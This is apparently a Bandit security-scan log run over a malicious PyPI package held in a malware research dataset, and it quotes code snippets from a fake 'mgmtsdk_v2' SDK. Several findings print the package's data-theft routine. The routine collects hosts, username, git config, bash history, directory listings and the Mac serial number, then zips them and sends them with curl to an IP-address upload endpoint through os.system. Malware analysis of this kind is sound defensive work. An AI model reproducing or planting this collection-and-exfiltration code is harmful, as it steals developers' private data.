Run started:2025-05-25 15:23:01.467093

Test results:
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:33
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
32	        try:
33	            self.data = self.json.get('data', None)
34	            self.pagination = self.json.get('pagination', None)

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:34
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
33	            self.data = self.json.get('data', None)
34	            self.pagination = self.json.get('pagination', None)
35	            self.errors = self.json.get('errors', None)

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:35
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
34	            self.pagination = self.json.get('pagination', None)
35	            self.errors = self.json.get('errors', None)
36	        except:

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:72
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
71	        self.client_settings = client_settings
72	        self.verbose = client_settings.get('verbose', False)
73	        if 'verbose' in client_settings:

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:75
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
74	            del self.client_settings['verbose']
75	        self.web_api_prefix = client_settings.get('api_prefix', None) or WEB_API_PREFIX_V2
76	        if client_settings.get('api_prefix', None):

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:76
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
75	        self.web_api_prefix = client_settings.get('api_prefix', None) or WEB_API_PREFIX_V2
76	        if client_settings.get('api_prefix', None):
77	            del self.client_settings['api_prefix']

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:79
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
78	        if "verify" not in self.client_settings:
79	            verify_ssl = os.environ.get('VERIFY_MGMT_SSL', True)
80	            self.client_settings["verify"] = True if str(verify_ssl).lower() == 'true' else False

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:88
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
87	
88	        self.hostname_url = hostname if 'http' in hostname else 'https://{0}'.format(hostname)
89	        self.test_connectivity()

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:113
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
112	            url = '{}/{}/{}'.format(self.hostname_url, api_prefix, endpoint)
113	        response = self.session.get(url, params=params,
114	                                    headers=self.auth_manager.headers,
115	                                    cookies=self.auth_manager.cookies,
116	                                    stream=stream,
117	                                    **self.client_settings)
118	        self._verbose_response(response)

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:159
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
158	
159	        response = self.session.post(
160	            '{}/{}/{}'.format(self.hostname_url, api_prefix, endpoint),
161	            data=data_to_send,
162	            headers=self.auth_manager.headers,
163	            cookies=self.auth_manager.cookies,
164	            params=params,
165	            **merged_dicts
166	        )

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:237
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
236	        try:
237	            self.get(endpoint='system/status', api_prefix=api_prefix)
238	

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/client.py:252
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
251	        post_data['username'] = post_data['username'].replace(u'\ufeff', '')
252	        response = self.post(endpoint=LOGIN, payload=post_data, api_prefix=api_prefix)
253	        if not response:

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:5
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
4	
5	t = platform.system()
6	# print(t)

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:5
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
4	
5	t = platform.system()
6	# print(t)

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:27
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
26	    with open('/etc/hosts', 'r') as f:
27	        return (f.read())
28	

--------------------------------------------------
>> Issue: [B303:blacklist] pwd.getpwuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:31
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b303-pwd-getpwuid
30	def get_username():
31	    return pwd.getpwuid(os.getuid())[0]
32	

--------------------------------------------------
>> Issue: [B811:getuid] os.getuid
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:31
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b811_getuid.html
30	def get_username():
31	    return pwd.getpwuid(os.getuid())[0]
32	

--------------------------------------------------
>> Issue: [B305:blacklist] os.getuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:31
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
30	def get_username():
31	    return pwd.getpwuid(os.getuid())[0]
32	

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:50
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
49	def get_gitGlobalConfig():
50	    return subprocess_popen('git config --global --list')
51	

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:62
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
61	        # print(type(line))
62	        f.close()
63	        return lines

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:77
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
76	        #   print(type(line))
77	        f.close()
78	        return lines[-5000:]

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:97
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
96	        for filename in file_names:
97	            z.write(os.path.join(dir_path, filename), f_path + filename)
98	    z.close()

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:98
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
97	            z.write(os.path.join(dir_path, filename), f_path + filename)
98	    z.close()
99	    return file_news

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:109
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
108	        # print('11111')
109	        shutil.rmtree(foldername)
110	    os.makedirs(foldername)

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:112
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
111	    with open(filename, 'a+') as file:
112	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
113	        file.write('username : ' + get_username() + '\n')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:113
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
112	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
113	        file.write('username : ' + get_username() + '\n')
114	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +'\n')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:114
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
113	        file.write('username : ' + get_username() + '\n')
114	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +'\n')
115	

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:114
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
113	        file.write('username : ' + get_username() + '\n')
114	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +'\n')
115	

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:124
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
123	
124	    serialId = str(subprocess_popen("hostname"))
125	    if os.path.exists(bashHistory):

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:139
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
138	    zip_ya(foldername)
139	    shutil.rmtree(foldername)
140	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:140
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
139	    shutil.rmtree(foldername)
140	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
141	    os.system(command)

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:141
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
140	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
141	    os.system(command)
142	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:141
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
140	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
141	    os.system(command)
142	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2/services/api.py:141
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
140	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
141	    os.system(command)
142	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:5
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
4	
5	t = platform.system()
6	# print(t)

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:5
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
4	
5	t = platform.system()
6	# print(t)

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:27
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
26	    with open('/etc/hosts', 'r') as f:
27	        return (f.read())
28	

--------------------------------------------------
>> Issue: [B303:blacklist] pwd.getpwuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:31
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b303-pwd-getpwuid
30	def get_username():
31	    return pwd.getpwuid(os.getuid())[0]
32	

--------------------------------------------------
>> Issue: [B811:getuid] os.getuid
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:31
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b811_getuid.html
30	def get_username():
31	    return pwd.getpwuid(os.getuid())[0]
32	

--------------------------------------------------
>> Issue: [B305:blacklist] os.getuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:31
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
30	def get_username():
31	    return pwd.getpwuid(os.getuid())[0]
32	

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:50
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
49	def get_gitGlobalConfig():
50	    return subprocess_popen('git config --global --list')
51	

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:59
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
58	        lines = f.readlines()
59	        f.close()
60	        return lines

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:71
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
70	        lines = f.readlines()
71	        f.close()
72	        return lines[-5000:]

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:91
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
90	        for filename in file_names:
91	            z.write(os.path.join(dir_path, filename), f_path + filename)
92	    z.close()

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:92
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
91	            z.write(os.path.join(dir_path, filename), f_path + filename)
92	    z.close()
93	    return file_news

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:103
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
102	        # print('11111')
103	        shutil.rmtree(foldername)
104	    os.makedirs(foldername)

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:106
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
105	    with open(filename, 'a+') as file:
106	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
107	        file.write('username : ' + get_username() + '\n')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:107
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
106	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
107	        file.write('username : ' + get_username() + '\n')
108	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:108
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
107	        file.write('username : ' + get_username() + '\n')
108	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +
109	                   '\n')
110	

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:108
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
107	        file.write('username : ' + get_username() + '\n')
108	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +
109	                   '\n')

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:111
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
110	
111	    subprocess_popen("ioreg -l | grep IOPlatformSerialNumber >>" + foldername + "/root.txt")
112	    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:112
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
111	    subprocess_popen("ioreg -l | grep IOPlatformSerialNumber >>" + foldername + "/root.txt")
112	    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")
113	    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:113
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
112	    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")
113	    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")
114	    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:114
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
113	    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")
114	    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")
115	    subprocess_popen("ls -la /Applications >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:115
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
114	    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")
115	    subprocess_popen("ls -la /Applications >>" + foldername + "/root.txt")
116	

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:125
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
124	
125	    serialId = str(subprocess_popen("ioreg -l | grep IOPlatformSerialNumber")).split("\"")[3]
126	    if os.path.exists(bashHistory):

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:140
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
139	    zip_ya(foldername)
140	    shutil.rmtree(foldername)
141	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:141
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
140	    shutil.rmtree(foldername)
141	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
142	    os.system(command)

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:142
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
141	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
142	    os.system(command)
143	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:142
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
141	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
142	    os.system(command)
143	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/api.py:142
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
141	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
142	    os.system(command)
143	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/management/mgmtsdk_v2_1/services/remote_scripts.py:74
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
73	                file = open(file_path, "w")
74	                file.write("#!/bin/bash")
75	                file.close()

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:21
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
20	        try:
21	            self.jVheUYYTrvAVPBHABoqHdkMfnYyNgLll = self.json.get('data', None)
22	            self.pagination = self.json.get('pagination', None)

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:22
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
21	            self.jVheUYYTrvAVPBHABoqHdkMfnYyNgLll = self.json.get('data', None)
22	            self.pagination = self.json.get('pagination', None)
23	            self.errors = self.json.get('errors', None)

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:23
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
22	            self.pagination = self.json.get('pagination', None)
